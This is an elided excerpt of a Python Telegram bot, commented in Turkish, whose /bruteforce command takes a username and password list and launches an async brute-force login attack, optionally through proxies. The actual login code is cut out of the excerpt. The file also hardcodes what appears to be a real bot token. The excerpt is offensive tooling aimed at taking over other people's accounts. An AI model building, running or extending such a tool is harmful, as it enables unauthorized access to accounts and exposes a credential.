...
CA_CERT_PATH = "SSL.crt"  # SSL sertifikası

# Telegram bot token'ınızı burada belirtin
TOKEN = '8043039788:AAEEAwJAjcwM20qwrzXXkCF6CzHS1CvHKhk'
...
async def main(username, passwords_file, use_proxy=False):
    passwords = []
    ...
    try:
        ...
        print(f"File not found: {passwords_file}")
        return
...
def start(update: Update, context: CallbackContext) -> None:
    ...
    password_file = context.args[1]
    use_proxy = "yes" in context.args[2].lower()

    update.message.reply_text(f"Brute-forcing {username} with {password_file} using proxy {use_proxy}...")

    asyncio.run(main(username, password_file, use_proxy))
    update.message.reply_text("Brute-force işlemi tamamlandı.")

def main_bot():
    updater = Updater(TOKEN)

    dp = updater.dispatcher
    dp.add_handler(CommandHandler("bruteforce", start))
